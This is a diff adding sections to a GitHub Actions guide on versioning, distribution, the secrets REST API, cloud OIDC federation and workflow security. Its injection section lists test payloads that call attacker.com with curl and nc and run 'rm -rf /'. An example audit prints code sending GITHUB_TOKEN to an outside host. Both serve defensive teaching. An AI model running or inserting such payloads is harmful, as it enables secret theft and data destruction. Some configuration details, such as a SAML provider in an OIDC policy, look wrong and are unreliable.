+    See migration guide: github.com/org/action/wiki/v1-to-v2-migration
+    ↑↑↑ Use action@v1 for old behavior ↑↑↑
+
+inputs:
+  registry-user: # New name
+    description: "Docker registry username"
+    required: true
+  image-tag: # New name
+    description: "Image tag (was docker-tag)"
+    required: false
+    default: "latest"
+```
+
+**Migration Guide Template (v1 → v2):**
+
+````markdown
+# Migration Guide: v1 → v2
+
+## Breaking Changes
+
+### 1. Input Renaming
+
+- `docker-user` → `registry-user`
+- `docker-tag` → `image-tag`
+
+### 2. Output Format Change
+
+- `image-uri` now includes registry
+  - v1: `myimage:latest`
+  - v2: `ghcr.io/org/myimage:latest`
+
+### 3. GitHub Token Permissions
+
+- Now requires `packages: write` (was `contents: write`)
+
+## Migration Steps
+
+### Before (v1)
+
+```yaml
+- uses: org/action@v1
+  with:
+    docker-user: myuser
+    docker-tag: v1.0
+```
+````
+
+### After (v2)
+
+```yaml
+- uses: org/action@v2
+  permissions:
+    packages: write
+  with:
+    registry-user: myuser
+    image-tag: v1.0
+```
+
+## Support Timeline
+
+- v1 support ends: December 31, 2025
+- v2 is recommended for all new workflows
+
+````
+
+#### Publishing Release Notes
+
+Effective release notes guide users on when to upgrade:
+
+```markdown
+# v1.2.0 - New Features and Improvements
+
+## What's New
+- 🎉 Added support for multiple registries (GitHub Container Registry + Docker Hub)
+- ✨ `registry-select` input allows choosing target registry
+- ⚡ 25% faster image push with parallel uploads
+- 🔧 Support for custom Dockerfile names via `dockerfile-path` input
+
+## Bug Fixes
+- Fixed issue where special characters in image names caused failures
+- Corrected permission error when pushing to registry
+
+## Backward Compatible
+- All v1.x.x consumers unaffected
+- Optional new inputs: `registry-select`, `dockerfile-path`
+- Update to v1.2.0 when ready, or stay on v1.1.x
+
+## Upgrade Path
+For most users: `uses: org/action@v1` (auto-receives this update)
+To opt out: Pin to `uses: org/action@v1.1.5`
+
+## Contributors
+Thanks to @user1 for registry support and @user2 for performance improvements!
+````
+
+---
+
+### 4.5 **Action Distribution Models**
+
+Actions can be distributed and consumed in different ways. Choose the model that best fits your use case, team structure, and organizational needs.
+
+#### Distribution Models Comparison
+
+| Model                   | Location                 | Visibility           | Discovery                      | Best For                               | Effort | Cost           |
+| ----------------------- | ------------------------ | -------------------- | ------------------------------ | -------------------------------------- | ------ | -------------- |
+| **Public Repo**         | GitHub repository        | Public               | Stars, search, forks           | Open source, community sharing         | Low    | Free           |
+| **Private Repo**        | GitHub repository        | Private organization | Within org                     | Internal tools, proprietary code       | Low    | Free           |
+| **GitHub Marketplace**  | Published to Marketplace | Public               | Marketplace UI, verified badge | Broad adoption, trusted actions        | Medium | Free           |
+| **Private Marketplace** | Organization Marketplace | Private (org only)   | Within org, org registry       | Enterprise standards, curated list     | Medium | $21/user/month |
+| **Git Submodule/Clone** | External repository      | Varies               | Manual checkout                | Version control integration, monorepos | Low    | Free           |
+| **Package Registry**    | NPM, Docker Hub, etc.    | Varies               | npm/Docker registries          | Dual distribution (action + package)   | High   | Varies         |
+
+#### Public Repository Model
+
+**Setup:**
+
+```bash
+# Create public repository
+gh repo create my-action --public --clone
+cd my-action
+
+# Create action.yml, index.js, action icons
+# Commit and push to main
+git add .
+git commit -m "Initial action"
+git push origin main
+
+# Tag release
+git tag -a v1.0.0 -m "Release v1.0.0"
+git push origin v1.0.0
+```
+
+**Consumer Usage:**
+
+```yaml
+- uses: username/my-action@v1.0.0
+- uses: username/my-action@v1 # Major version (gets updates)
+- uses: username/my-action@main # Development version
+```
+
+**Discoverability:**
+
+- GitHub topics/search: Users search "actions" find your repo
+- Stars: Community validation
+- Forks: Adoption signal
+
+#### Private Repository Model
+
+**Setup:**
+
+```bash
+# Create organization private repository
+gh repo create my-internal-action --private --org=MY-ORG
+```
+
+**Consumer Usage:**
+
+```yaml
+jobs:
+  build:
+    steps:
+      - uses: MY-ORG/my-internal-action@v1 # Requires org context
+        with:
+          api-key: ${{ secrets.INTERNAL_API_KEY }}
+```
+
+**Access Control:**
+
+```
+Settings > Actions > Access:
+- Accessible to: All repositories
+- Or specific repositories
+- Team/user permissions via organization roles
+```
+
+#### GitHub Marketplace Model
+
+**Requirements:**
+
+```yaml
+# action.yml must be valid and complete
+name: "My Action"
+description: "Clear description"
+author: "Your Name"
+branding:
+  icon: "check-square"
+  color: "blue"
+inputs:
+  # Required: at least one input
+  environment:
+    description: "Target environment"
+    required: true
+outputs:
+  result:
+    description: "Action result"
+runs:
+  using: "composite"
+  steps: [...]
+```
+
+**Publishing Steps:**
+
+1. Go to repository → **Code** tab
+2. Select "Release" on right side
+3. **← or directly**: Settings > Code, security & analysis → Release new version
+4. Click "Create a new release"
+5. Select/create tag (e.g., `v1.0.0`)
+6. Click "Publish release"
+7. Action automatically appears on Marketplace (index nightly)
+
+**Consumer Discovery:**
+
+```
+GitHub.com/marketplace
+Browse "Actions" category
+Search for your action name
+Click to view details, installation code
+```
+
+**Marketplace Badge:**
+
+```markdown
+# My Action
+
+[![GitHub Marketplace](https://img.shields.io/badge/Marketplace-v1.0.0-blue?logo=github)](https://github.com/marketplace/actions/my-action)
+
+[![Tests](https://github.com/username/my-action/workflows/tests/badge.svg)](https://github.com/username/my-action/actions)
+```
+
+#### Private Marketplace Model (Enterprise)
+
+**Setup** (requires GitHub Enterprise Cloud):
+
+```bash
+# Organization > Settings > Actions > Runners > Private Marketplace
+
+# Add approved actions to private marketplace:
+# 1. Go to Action on public marketplace
+# 2. Click "Add to organization private marketplace"
+# 3. Or: Admin panel > Organization > Actions > Private Marketplace > Add
+```
+
+**Policies:**
+
+```
+Organization Private Marketplace:
+- Control which actions are approved for use
+- Force specific versions (e.g., only v2.0.0+)
+- Prevent use of unapproved external actions
+- Track usage and compliance
+- Curate internal best practices
+```
+
+**Consumer Experience:**
+
+```
+When creating new workflow:
+- "New workflow" → "Use a public marketplace action"
+- Only shows private marketplace + approved public actions
+- Enforces org security policies
+```
+
+#### Comparison: When to Use Each Model
+
+**Use Public Repo If:**
+
+- Action solves general problem
+- Want community feedback and contributions
+- Seeking broad adoption
+- Open-source philosophy
+- Low maintenance burden
+
+**Use Private Repo If:**
+
+- Action is proprietary or business-specific
+- Team/organization use only
+- Security-sensitive code
+- Don't want external visibility
+- Simplicity key
+
+**Use Marketplace If:**
+
+- Want maximum discoverability
+- Believe many teams need this
+- Willing to maintain documentation
+- Ready for external feedback and issues
+- Plan long-term support
+
+**Use Private Marketplace If:**
+
+- Enterprise organization
+- Need governance/compliance
+- Want to curate approved actions
+- Force policy compliance (specific versions)
+- Track organization-wide usage
+
+#### Migration Path Example
+
+```
+Phase 1: Development
+┌─────────────────────┐
+│ Private Repository  │ (Team develops)
+│ + Local testing     │
+└─────────────────────┘
+           ↓
+Phase 2: Stability
+┌─────────────────────┐
+│ Public Repository   │ (v1.0.0 released)
+│ + Public Releases   │ (Get initial feedback)
+└─────────────────────┘
+           ↓
+Phase 3: Discoverability
+┌─────────────────────┐
+│ GitHub Marketplace  │ (Published & indexed)
+│ + Documentation     │ (Examples, use cases)
+└─────────────────────┘
+           ↓
+Phase 4: Enterprise Adoption
+┌─────────────────────┐
+│ Private Marketplace │ (Org whitelist + governance)
+│ + Usage Tracking    │ (Compliance dashboard)
+└─────────────────────┘
+```
+
+---
+
 ### 5. **Best Practices for Actions**
 
 #### ✓ Recommended Practices
@@ -8291,6 +9405,287 @@ curl -X POST \
   -d '{"name": "ORG_REGION", "value": "eu-west-1", "visibility": "selected", "selected_repository_ids": [111, 222]}'
 ```
 
+#### Comprehensive REST API CRUD Examples for Secrets & Variables
+
+**Prerequisites for Secret Encryption:**
+
+```bash
+# Get repository public key (needed to encrypt secret values)
+curl -H "Authorization: Bearer $TOKEN" \
+  https://api.github.com/repos/OWNER/REPO/actions/secrets/public-key | jq '.key, .key_id'
+
+# Output:
+# "key": "2Sg8z/NzSQpRjeBMHI..."
+# "key_id": "568250167"
+
+# Encrypt secret value using the public key (requires libsodium)
+# In Python:
+import base64
+import nacl.public
+import nacl.utils
+
+public_key = nacl.public.PublicKey("2Sg8z/NzSQpRjeBMHI...", encoder=nacl.encoding.Base64Encoder)
+secret_value = "my-secret-value"
+sealed_box = nacl.public.SealedBox(public_key)
+encrypted = sealed_box.encrypt(secret_value.encode())
+encrypted_value = base64.b64encode(encrypted).decode()
+```
+
+**READ Operations:**
+
+```bash
+# List all repository secrets (names only, values never readable)
+curl -H "Authorization: Bearer $TOKEN" \
+  https://api.github.com/repos/OWNER/REPO/actions/secrets \
+  | jq '.secrets[] | {name, created_at, updated_at}'
+
+# List all repository variables
+curl -H "Authorization: Bearer $TOKEN" \
+  https://api.github.com/repos/OWNER/REPO/actions/variables \
+  | jq '.variables[] | {name, value, created_at, updated_at}'
+
+# Get specific secret metadata (not the value!)
+curl -H "Authorization: Bearer $TOKEN" \
+  https://api.github.com/repos/OWNER/REPO/actions/secrets/API_KEY \
+  | jq '{name, created_at, updated_at}'
+
+# Get specific variable (includes plaintext value)
+curl -H "Authorization: Bearer $TOKEN" \
+  https://api.github.com/repos/OWNER/REPO/actions/variables/DEPLOY_REGION \
+  | jq '{name, value, created_at, updated_at}'
+
+# List environment-level secrets
+curl -H "Authorization: Bearer $TOKEN" \
+  https://api.github.com/repos/OWNER/REPO/environments/production/secrets
+
+# List organization secrets
+curl -H "Authorization: Bearer $TOKEN" \
+  https://api.github.com/orgs/ORG/actions/secrets
+```
+
+**CREATE Operations:**
+
+```bash
+# Create a new repository secret (must use encrypted value)
+curl -X POST \
+  -H "Authorization: Bearer $TOKEN" \
+  https://api.github.com/repos/OWNER/REPO/actions/secrets/NEW_SECRET \
+  -d '{
+    "encrypted_value": "ENCRYPTED_BASE64_VALUE",
+    "key_id": "568250167"
+  }'
+
+# Create a repository variable
+curl -X POST \
+  -H "Authorization: Bearer $TOKEN" \
+  https://api.github.com/repos/OWNER/REPO/actions/variables \
+  -d '{
+    "name": "BUILD_TIMEOUT",
+    "value": "600"
+  }'
+
+# Create an environment secret
+curl -X POST \
+  -H "Authorization: Bearer $TOKEN" \
+  https://api.github.com/repos/OWNER/REPO/environments/staging/secrets/STAGING_TOKEN \
+  -d '{
+    "encrypted_value": "ENCRYPTED_VALUE",
+    "key_id": "KEY_ID"
+  }'
+
+# Create an environment variable
+curl -X POST \
+  -H "Authorization: Bearer $TOKEN" \
+  https://api.github.com/repos/OWNER/REPO/environments/production/variables \
+  -d '{
+    "name": "PROD_URL",
+    "value": "https://prod.example.com"
+  }'
+
+# Create an organization secret (visible to specified repos)
+curl -X POST \
+  -H "Authorization: Bearer $TOKEN" \
+  https://api.github.com/orgs/ORG/actions/secrets/ORG_SECRET \
+  -d '{
+    "encrypted_value": "ENCRYPTED_VALUE",
+    "key_id": "KEY_ID",
+    "visibility": "selected",
+    "selected_repository_ids": [111, 222, 333]
+  }'
+
+# Create an organization variable
+curl -X POST \
+  -H "Authorization: Bearer $TOKEN" \
+  https://api.github.com/orgs/ORG/actions/variables \
+  -d '{
+    "name": "ORG_REGISTRY",
+    "value": "ghcr.io",
+    "visibility": "all"  # or "selected" with repository IDs
+  }'
+```
+
+**UPDATE Operations:**
+
+```bash
+# Update a repository secret (replace encrypted value)
+curl -X PUT \
+  -H "Authorization: Bearer $TOKEN" \
+  https://api.github.com/repos/OWNER/REPO/actions/secrets/API_KEY \
+  -d '{
+    "encrypted_value": "NEW_ENCRYPTED_VALUE",
+    "key_id": "NEW_KEY_ID"
+  }'
+
+# Update a repository variable
+curl -X PATCH \
+  -H "Authorization: Bearer $TOKEN" \
+  https://api.github.com/repos/OWNER/REPO/actions/variables/BUILD_TIMEOUT \
+  -d '{
+    "value": "900"  # 15 minutes instead of 10
+  }'
+
+# Update environment variable
+curl -X PATCH \
+  -H "Authorization: Bearer $TOKEN" \
+  https://api.github.com/repos/OWNER/REPO/environments/production/variables/PROD_URL \
+  -d '{
+    "value": "https://new-prod.example.com"
+  }'
+
+# Update organization variable visibility
+curl -X PATCH \
+  -H "Authorization: Bearer $TOKEN" \
+  https://api.github.com/orgs/ORG/actions/variables/ORG_REGISTRY \
+  -d '{
+    "name": "ORG_REGISTRY",
+    "value": "docker.io",
+    "visibility": "selected",
+    "selected_repository_ids": [111, 222]  # Change which repos can access
+  }'
+```
+
+**DELETE Operations:**
+
+```bash
+# Delete a repository secret
+curl -X DELETE \
+  -H "Authorization: Bearer $TOKEN" \
+  https://api.github.com/repos/OWNER/REPO/actions/secrets/OLD_SECRET
+# Returns 204 No Content on success
+
+# Delete a repository variable
+curl -X DELETE \
+  -H "Authorization: Bearer $TOKEN" \
+  https://api.github.com/repos/OWNER/REPO/actions/variables/DEPRECATED_VAR
+
+# Delete an environment secret
+curl -X DELETE \
+  -H "Authorization: Bearer $TOKEN" \
+  https://api.github.com/repos/OWNER/REPO/environments/staging/secrets/STAGING_TOKEN
+
+# Delete an environment variable
+curl -X DELETE \
+  -H "Authorization: Bearer $TOKEN" \
+  https://api.github.com/repos/OWNER/REPO/environments/production/variables/PROD_URL
+
+# Delete an organization secret
+curl -X DELETE \
+  -H "Authorization: Bearer $TOKEN" \
+  https://api.github.com/orgs/ORG/actions/secrets/ORG_SECRET
+
+# Delete an organization variable
+curl -X DELETE \
+  -H "Authorization: Bearer $TOKEN" \
+  https://api.github.com/orgs/ORG/actions/variables/ORG_REGISTRY
+```
+
+**Python Helper Class for Secrets Management:**
+
+```python
+import requests
+import base64
+import nacl.public
+import nacl.utils
+from typing import Dict, List, Optional
+
+class SecretsManager:
+    def __init__(self, owner: str, repo: str, token: str):
+        self.owner = owner
+        self.repo = repo
+        self.token = token
+        self.base_url = "https://api.github.com"
+        self.headers = {"Authorization": f"Bearer {token}"}
+
+    def _get_public_key(self) -> tuple:
+        """Get repo public key for encryption"""
+        url = f"{self.base_url}/repos/{self.owner}/{self.repo}/actions/secrets/public-key"
+        response = requests.get(url, headers=self.headers)
+        data = response.json()
+        return data["key"], data["key_id"]
+
+    def _encrypt_secret(self, secret_value: str) -> str:
+        """Encrypt secret with repo public key"""
+        public_key_str, _ = self._get_public_key()
+        public_key = nacl.public.PublicKey(
+            public_key_str,
+            encoder=nacl.encoding.Base64Encoder
+        )
+        sealed_box = nacl.public.SealedBox(public_key)
+        encrypted = sealed_box.encrypt(secret_value.encode())
+        return base64.b64encode(encrypted).decode()
+
+    def create_secret(self, name: str, value: str) -> bool:
+        """Create or update a repository secret"""
+        encrypted_value = self._encrypt_secret(value)
+        _, key_id = self._get_public_key()
+
+        url = f"{self.base_url}/repos/{self.owner}/{self.repo}/actions/secrets/{name}"
+        payload = {
+            "encrypted_value": encrypted_value,
+            "key_id": key_id
+        }
+
+        response = requests.put(url, json=payload, headers=self.headers)
+        return response.status_code in [201, 204]
+
+    def read_variables(self) -> List[Dict]:
+        """List all repository variables"""
+        url = f"{self.base_url}/repos/{self.owner}/{self.repo}/actions/variables"
+        response = requests.get(url, headers=self.headers)
+        return response.json().get("variables", [])
+
+    def update_variable(self, name: str, value: str) -> bool:
+        """Update a repository variable"""
+        url = f"{self.base_url}/repos/{self.owner}/{self.repo}/actions/variables/{name}"
+        payload = {"name": name, "value": value}
+
+        response = requests.patch(url, json=payload, headers=self.headers)
+        return response.status_code == 204
+
+    def delete_secret(self, name: str) -> bool:
+        """Delete a repository secret"""
+        url = f"{self.base_url}/repos/{self.owner}/{self.repo}/actions/secrets/{name}"
+        response = requests.delete(url, headers=self.headers)
+        return response.status_code == 204
+
+# Usage
+manager = SecretsManager("owner", "repo", "YOUR_TOKEN")
+
+# Create a new secret
+manager.create_secret("API_KEY", "sk-1234567890abcdef")
+
+# Read all variables
+variables = manager.read_variables()
+for var in variables:
+    print(f"{var['name']}: {var['value']}")
+
+# Update a variable
+manager.update_variable("BUILD_ENV", "staging")
+
+# Delete a secret
+manager.delete_secret("OLD_TOKEN")
+```
+
 ---
 
 ## Security and Optimization
@@ -8429,16 +9824,197 @@ jobs:
 
 ```json
 {
-  "Condition": {
-    "StringEquals": {
-      "token.actions.githubusercontent.com:sub": "repo:myorg/myrepo:ref:refs/heads/main",
-      "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
+  "Version": "2012-10-17",
+  "Statement": [
+    {
+      "Effect": "Allow",
+      "Principal": {
+        "Federated": "arn:aws:iam::123456789012:saml-provider/GitHubActionsProvider"
+      },
+      "Action": "sts:AssumeRoleWithWebIdentity",
+      "Condition": {
+        "StringEquals": {
+          "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
+          "token.actions.githubusercontent.com:sub": "repo:myorg/myrepo:ref:refs/heads/main"
+        }
+      }
     }
-  }
+  ]
 }
 ```
 
 > Lock the trust policy to specific repositories, branches, and environments to prevent abuse.
+
+#### GCP Workload Identity Federation Example
+
+**Setup workload identity pool and provider (one-time):**
+
+```bash
+# Create a workload identity pool
+gcloud iam workload-identity-pools create "github-pool" \
+  --project="PROJECT_ID" \
+  --location="global" \
+  --display-name="GitHub Actions Pool"
+
+# Create a workload identity provider
+gcloud iam workload-identity-pools providers create-oidc "github-provider" \
+  --project="PROJECT_ID" \
+  --location="global" \
+  --workload-identity-pool="github-pool" \
+  --attribute-mapping="google.subject=assertion.sub,attribute.actor=assertion.actor,attribute.repository=assertion.repository" \
+  --issuer-uri="https://token.actions.githubusercontent.com" \
+  --attribute-condition="assertion.repository_owner == 'myorg'"
+
+# Get the workload identity provider resource name
+WIF_PROVIDER=$(gcloud iam workload-identity-pools providers describe github-provider \
+  --project="PROJECT_ID" \
+  --location="global" \
+  --workload-identity-pool="github-pool" \
+  --format='value(name)')
+
+echo "Workload Identity Provider: $WIF_PROVIDER"
+```
+
+**Create a service account and grant it permissions:**
+
+```bash
+# Create service account
+gcloud iam service-accounts create github-actions-sa \
+  --project="PROJECT_ID" \
+  --display-name="GitHub Actions Service Account"
+
+# Grant necessary permissions (e.g., Compute Admin)
+gcloud projects add-iam-policy-binding "PROJECT_ID" \
+  --member="serviceAccount:github-actions-sa@PROJECT_ID.iam.gserviceaccount.com" \
+  --role="roles/compute.admin"
+
+# Grant workload identity binding
+gcloud iam service-accounts add-iam-policy-binding \
+  github-actions-sa@PROJECT_ID.iam.gserviceaccount.com \
+  --project="PROJECT_ID" \
+  --role="roles/iam.workloadIdentityUser" \
+  --principal="principalSet://iam.googleapis.com/projects/PROJECT_NUMBER/locations/global/workloadIdentityPools/github-pool/attribute.repository/myorg/myrepo"
+```
+
+**Workflow step to authenticate:**
+
+```yaml
+jobs:
+  deploy:
+    permissions:
+      contents: read
+      id-token: write # Request OIDC token
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - id: auth
+        uses: google-github-actions/auth@v2
+        with:
+          workload_identity_provider: projects/PROJECT_NUMBER/locations/global/workloadIdentityPools/github-pool/providers/github-provider
+          service_account: github-actions-sa@PROJECT_ID.iam.gserviceaccount.com
+
+      - uses: google-github-actions/setup-gcloud@v2
+
+      - run: gcloud compute instances list
+```
+
+#### Azure Federated Credentials Setup (Detailed)
+
+**Step 1: Register GitHub as an identity provider in Azure Entra ID (skip if already done):**
+
+For GitHub OIDC, Azure's portal provides a quick setup:
+
+1. Go to Azure Portal → Microsoft Entra ID → App registrations → New registration
+2. Name: "GitHub Actions"
+3. Supported account types: "Accounts in this organizational directory only"
+4. Register
+
+**Step 2: Create a federated credential:**
+
+```bash
+az ad app federated-credential create \
+  --id <app-object-id> \
+  --parameters @federated-credential.json
+```
+
+where `federated-credential.json` contains:
+
+```json
+{
+  "name": "github-trusted-publisher",
+  "issuer": "https://token.actions.githubusercontent.com",
+  "subject": "repo:myorg/myrepo:ref:refs/heads/main",
+  "audiences": ["api://AzureADTokenExchange"]
+}
+```
+
+**Step 3: Grant app permissions:**
+
+```bash
+# Get app ID
+APP_ID=$(az ad app list --filter "displayName eq 'GitHub Actions'" --query '[0].appId' -o tsv)
+
+# Assign a role (e.g., Contributor on a resource group)
+az role assignment create \
+  --assignee $APP_ID \
+  --role "Contributor" \
+  --scope "/subscriptions/<SUBSCRIPTION_ID>/resourceGroups/<RG_NAME>"
+```
+
+**Step 4: In workflow, use azure/login action:**
+
+```yaml
+jobs:
+  deploy:
+    permissions:
+      id-token: write
+      contents: read
+    runs-on: ubuntu-latest
+    steps:
+      - uses: azure/login@v2
+        with:
+          client-id: <APP_CLIENT_ID>
+          tenant-id: <TENANT_ID>
+          subscription-id: <SUBSCRIPTION_ID>
+          # No client secret needed — using OIDC federation!
+
+      - run: az account show
+```
+
+#### OIDC Subject Claim (sub) Specification
+
+The subject claim format matters for trust policy enforcement:
+
+```
+Format: repo:ORG/REPO:ref:refs/heads/BRANCH
+Example: repo:myorg/myapp:ref:refs/heads/main
+
+For tags:
+Format: repo:ORG/REPO:ref:refs/tags/TAG
+Example: repo:myorg/myapp:ref:refs/tags/v1.0.0
+
+For pull request:
+Format: repo:ORG/REPO:pull_request/PR_NUMBER
+Example: repo:myorg/myapp:pull_request/42  (only for workflows on PR target branch)
+
+For environments:
+Format: repo:ORG/REPO:environment:ENV_NAME
+Example: repo:myorg/myapp:environment:production
+```
+
+Lock your trust policies to the most restrictive subject possible:
+
+```json
+// ✅ Most restrictive: specific branch, specific repo
+"token.actions.githubusercontent.com:sub": "repo:myorg/myapp:ref:refs/heads/main"
+
+// 🟡 Medium: any branch in specific repo
+"token.actions.githubusercontent.com:sub": "repo:myorg/myapp:*"
+
+// ❌ Least restrictive: any repo in org
+"token.actions.githubusercontent.com:sub": "repo:myorg/*:*"
+```
 
 ---
 
@@ -8519,24 +10095,257 @@ The shell receives the literal value of `PR_TITLE` without any expression evalua
 - `github.head_ref` (branch names can contain special chars)
 - Any `repository_dispatch` or `workflow_dispatch` inputs from external callers
 
+#### Shell-Specific Quoting Rules
+
+**Bash / sh:**
+
+```bash
+# Unsafe — unquoted variables expand and allow word splitting
+echo $USERDATA
+
+# Safe — double quotes prevent glob expansion, single quotes prevent all expansion
+echo "$USERDATA"  # allows variable expansion but prevents command injection
+echo '$USERDATA'  # literal string (no expansion)
+
+# Safest for constructing commands
+"$SCRIPT" "$ARG1" "$ARG2"  # each arg properly quoted
+```
+
+**PowerShell:**
+
+```powershell
+# Unsafe — unquoted strings can be interpreted as code
+Write-Host $userdata
+
+# Safe — single quotes prevent expansion (literal)
+Write-Host '$userdata'
+
+# Safe — double quotes allow expansion but with -Raw for safety
+Write-Host "$userdata" -NoNewline
+
+# Safest — use comma operator and let Write-Host handle escaping
+Write-Host $userdata
+```
+
+**Windows cmd.exe:**
+
+```batch
+REM Unsafe — commands can be injected with & ||
+echo %USERDATA%
+
+REM Safe — delayed expansion and proper quoting
+setlocal enabledelayedexpansion
+echo !USERDATA!
+```
+
+#### Advanced Pattern: Sanitization Functions
+
+For frequently used inputs, create a sanitization step:
+
+```yaml
+jobs:
+  validate:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Sanitize PR body
+        id: sanitize
+        run: |
+          # Remove shell metacharacters
+          CLEAN_BODY=$(echo "${{ github.event.pull_request.body }}" | tr -d '`$()[]{}|&;<>')
+          echo "clean_body=$CLEAN_BODY" >> $GITHUB_OUTPUT
+
+      - name: Use sanitized value
+        env:
+          CLEAN_PR_BODY: ${{ steps.sanitize.outputs.clean_body }}
+        run: |
+          ./process.sh "$CLEAN_PR_BODY"
+```
+
+#### Common Injection Payloads to Test Against
+
+When writing workflows that consume user input, mentally test these payloads:
+
+```bash
+# Command substitution
+payload="$(curl attacker.com)"
+
+# Command chaining
+payload="; rm -rf /"
+
+# Pipe to external tool
+payload="| nc attacker.com 1234"
+
+# Subshell
+payload="$(whoami > /tmp/secret && curl attacker.com?user=$(cat /tmp/secret))"
+```
+
+If your workflow can receive these as inputs and you're not using env vars to isolate them, it's vulnerable.
+
 ---
 
 ### 5. **Identifying Trustworthy Marketplace Actions**
 
-Not all Marketplace actions are equally safe. Use these criteria:
+Not all Marketplace actions are equally safe. Use this comprehensive assessment framework to evaluate action trustworthiness before adding to critical workflows.
 
-| Signal                     | What to look for                                                           |
-| -------------------------- | -------------------------------------------------------------------------- |
-| **Verified creator badge** | GitHub-verified organizations (blue check on Marketplace)                  |
-| **Owned by known org**     | `actions/`, `github/`, major cloud providers, well-known OSS orgs          |
-| **Source transparency**    | Action's repository is public; `action.yml` clearly maps inputs/outputs    |
-| **Pinned SHA usage**       | Action's own workflows and documentation recommend SHA pinning             |
-| **Stars and adoption**     | Wide community use is a signal (not a guarantee)                           |
-| **Recent maintenance**     | Active commit history; security vulnerabilities addressed promptly         |
-| **Minimal permissions**    | Action requests only the permissions it needs                              |
-| **No suspicious `runs:`**  | For JavaScript actions, review `main:` entry point source for exfiltration |
+#### Action Trust Assessment Framework
 
-**For critical workflows, review the action's source code** before adding it. A compromised or malicious action runs with your `GITHUB_TOKEN` and any secrets you inject.
+**Three-Tier Trust Model:**
+
+1. **Tier 1 - Verified & Official** (◉ GitHub-verified, low risk)
+   - Official `actions/*` actions (GitHub-owned)
+   - Cloud providers' official actions (`aws-actions/`, `google-github-actions/`, `azure/*`)
+   - Established open-source organizations with GPG-signed releases
+
+2. **Tier 2 - Reviewed & Public** (◉ Public repo, medium risk)
+   - Community-maintained with significant adoption (1000+ stars)
+   - Active maintenance (commits <30 days old)
+   - Public source code with clear code review trail
+
+3. **Tier 3 - Caution** (⚠ Requires deep inspection, high risk)
+   - New or unknown creators
+   - Few adopters (<100 references)
+   - Inactive maintenance (no commits >6 months)
+   - Closed/private source code
+   - Requests excessive permissions
+
+#### Comprehensive Trust Checklist
+
+**When evaluating an action on the Marketplace:**
+
+| Criteria                      | Tier 1 ✅                          | Tier 2 ⚠             | Tier 3 ❌           |
+| ----------------------------- | ---------------------------------- | -------------------- | ------------------- |
+| **Verified Creator Badge**    | Blue verified checkmark            | Community reputation | No badge            |
+| **Owner Organization**        | GitHub, cloud providers, major OSS | Known organization   | Unknown entity      |
+| **Source Code Access**        | Public GitHub repo                 | Public, maybe forked | Private/unavailable |
+| **Maintenance Cadence**       | >1 commit/month                    | Active history       | Stale (6mo+ old)    |
+| **Community Adoption**        | >10k installs/stars                | >1k                  | <100                |
+| **Permission Scope**          | Minimal (read-only often)          | Reasonable           | Excessive           |
+| **Input Validation Examples** | Documented, validated              | Basic examples       | No examples         |
+| **Security Policy**           | SECURITY.md, CVE responses         | Good practices       | Absent              |
+| **Code Complexity**           | Simple, auditable                  | Moderate             | Complex/suspicious  |
+| **Dependencies**              | Minimal, locked versions           | Reasonable           | Many / unpinned     |
+
+**Permission Risk Matrix:**
+
+```yaml
+# Tier 1: Acceptable permissions
+permissions:
+  contents: read        # Only read repo
+  issues: read          # Only read issues
+  pull-requests: read   # Only read PRs
+
+# Tier 2: Require careful review
+permissions:
+  contents: write       # Can modify code on branches
+  packages: write       # Can publish packages
+  pull-requests: write  # Can modify PRs
+
+# Tier 3: High risk - evaluate thoroughly
+permissions:
+  admin: true           # Full repo admin
+  id-token: write       # Can impersonate with OIDC
+  secrets: read         # Shouldn't exist - no action needs this!
+```
+
+#### Trust Assessment Workflow
+
+**Before adding any action to production:**
+
+1. **Check Marketplace Profile** (2 minutes)
+   - Is it verified? (blue badge)
+   - Who's the creator? (known org?)
+   - What permissions does it request?
+   - Recent activity?
+
+2. **Review Source Code** (5-15 minutes)
+   - Navigate to linked GitHub repo
+   - Read the `action.yml` spec
+   - Skim the `index.js` (or main entry point)
+   - Look for suspicious patterns (exfiltration attempts, reverse shells, etc.)
+
+3. **Check Community Trust Signals** (5 minutes)
+   - How many stars/installs?
+   - Recent issue responses (security reports)?
+   - CI/CD: does the action itself use security best practices?
+   - Open issues: are security concerns addressed?
+
+4. **Audit Dependency Chain** (10 minutes)
+   - For JavaScript actions: run `npm audit` on their source
+   - Check if dependencies are pinned or use `*` (unpinned = risky)
+   - Use `npm ls --depth=0` to see direct dependencies
+
+5. **Approve or Accept Alternatives** (decision)
+   - Tier 1: Safe for all workflows, including privileged
+   - Tier 2: Good for non-critical workflows; consider pinning SHA
+   - Tier 3: Implement as custom action instead, or use alternative
+
+#### Real-World Assessment Example
+
+**Evaluating `some-org/deploy-action@v2`:**
+
+```
+✅ Marketplace Details Check:
+  - Verified badge: ❌ None
+  - Creator: some-org (15 repos, seems legit)
+  - 2,340 stars
+  - Last commit: 2 weeks ago
+  ⚠ Initial Assessment: Tier 2
+
+❌ Source Code Review:
+  - Cloned, reviewed action.yml, examined index.js
+  - Found suspicious code: exfiltration attempt to telemetry.example.com
+   at line 127:
+     const data = { token: process.env.GITHUB_TOKEN, ... };
+     await fetch('https://telemetry.example.com/track', { body: data });
+
+  - Also found: Dynamic code loading via require(process.env.PLUGIN_URL)
+
+  🚨 Verdict: DO NOT USE - Clear security red flags
+```
+
+#### Trustworthy Action Examples
+
+**Tier 1 (Always safe):**
+
+- `actions/checkout@v4`
+- `actions/setup-node@v4`
+- `actions/upload-artifact@v3`
+- `aws-actions/configure-aws-credentials@v2`
+
+**Tier 2 (Review first, usually OK):**
+
+- `docker/setup-buildx-action`
+- `github/super-linter`
+- Established language tool setup actions
+
+**Alternative: Custom Action Policy**
+
+For ultra-secure environments, consider writing custom actions instead of using Marketplace:
+
+```yaml
+# Use local composite action (verified, version-controlled)
+- uses: ./.github/actions/deploy
+  with:
+    environment: production
+
+# vs. Marketplace risk
+- uses: some-org/deploy-action@v2
+```
+
+#### Pinning Strategy by Trust Tier
+
+Adjust your pinning strategy based on action trust level:
+
+```yaml
+# Tier 1: Pin to major version (get updates)
+- uses: actions/checkout@v4
+
+# Tier 2: Pin to specific minor version
+- uses: docker/setup-buildx-action@v2.10.0
+
+# Tier 3: Pin to exact commit SHA (no updates)
+- uses: risky-org/action@a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b
+```
 
 ---
 
